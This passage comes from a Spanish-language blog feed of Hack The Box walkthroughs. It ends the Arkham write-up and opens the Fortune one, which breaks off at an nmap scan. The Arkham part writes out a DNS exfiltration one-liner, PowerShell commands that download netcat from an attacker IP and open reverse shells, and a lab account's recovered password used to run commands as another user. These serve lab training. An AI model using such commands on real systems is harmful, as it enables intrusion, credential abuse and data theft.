&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;dir C:\Users&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;//10.10.13.129 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; /f &lt;span class=&#34;s2&#34;&gt;&amp;#34;tokens=1,2,3&amp;#34;&lt;/span&gt; %a in &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dir /B &amp;#34;C:\Users&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; nslookup %a.%b.%c 10.10.13.129
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.15.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;reverse-shell---alfred&#34;&gt;REVERSE SHELL - Alfred&lt;/h2&gt;
&lt;p&gt;Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) y ejecutar una shell inversa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Comando&lt;/strong&gt;: Cambiamos el primer parametro de cmand a &amp;ldquo;powershell&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;129&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Public&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsPowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;129&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos una shell inversa como Alfred y nuestra bandera &lt;code&gt;User.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2018-33.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.35.33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;usuarios---arkham&#34;&gt;USUARIOS - Arkham&lt;/h3&gt;
&lt;p&gt;Podemos ver que existen otros dos usuarios Batman y Administrator.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.57.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos que Batman pertenece al grupo de Administrators.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.01.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;user---batman&#34;&gt;USER - BATMAN&lt;/h2&gt;
&lt;p&gt;En el directorio &lt;code&gt;C:\Users\alfred\Downloads\backups&lt;/code&gt; encontramos un archivo &lt;code&gt;backup.zip&lt;/code&gt;, lo trasladamos a nuestra maquina con &lt;a href=&#34;https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/&#34;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.37.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al descomprimirlo nos muestra un archivo &lt;code&gt;.ost&lt;/code&gt; de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (&lt;code&gt;Drafts.mbox&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.40.52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para lectura de &lt;code&gt;Drafts.mbox&lt;/code&gt; utilizamos &lt;code&gt;mutt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;mutt -Rf Drafts.mbox
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2018-51.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos una imagen de cmd con un comando que contiene un usuario y contraseña:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;net use G: &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.10&lt;span class=&#34;se&#34;&gt;\g&lt;/span&gt;otham /user:batman Zx^#QZX+T!123
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.55.13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos powershell para cambiar al usuario(sesion) Batman con el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ARKHAM\batman&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;convertto-securestring&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-String&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Zx^#QZX+T!123&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-PSSession&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cred&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Enter-PSSession&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2019-03.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.05.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;reverse-shell---batman&#34;&gt;REVERSE SHELL - BATMAN&lt;/h2&gt;
&lt;p&gt;Para obtener una shell inversa con el usuario Batman vamos a utilizar &lt;code&gt;Invoke-Command&lt;/code&gt; para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ARKHAM\batman&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Zx^#QZX+T!123&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$securePassword&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$password&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Management&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Automation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PSCredential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$securePassword&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-Command&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Credential&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$credential&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComputerName&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ARKHAM&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Command&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;wget &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;8081&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-o&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Batman&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Batman&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;System32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsPowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;445&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-18%2015-37.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos una shell y podemos ejecutar comandos, pero no podemos acceder a la carpeta de Administrator.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-18%2015.39.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por alguna razon el siguiente comando funciona para acceder a la carpeta de Administrator, y obtenemos nuestra bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;10.10.10.130&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;$&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-18%2015.41.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/arkham/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/arkham/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
            
              <category>deserialization</category>
            
          
            
              <category>readpst</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Fortune</title>
        <link>https://sckull.github.io/posts/fortune/</link>
        <pubDate>Sat, 03 Aug 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 03 Aug 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/fortune/</guid>
        <description>Fortune es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Fortune es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/fortune/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Fortune&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Otro&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;50&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.127&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/46317&#34;&gt;AuxSarge&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Al realizar un escaneo con nmap.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.70 scan initiated Wed Mar 13 22:48:02 2019 as: nmap -sV -sC -A -o nmap.scan 10.10.10.127&lt;/span&gt;
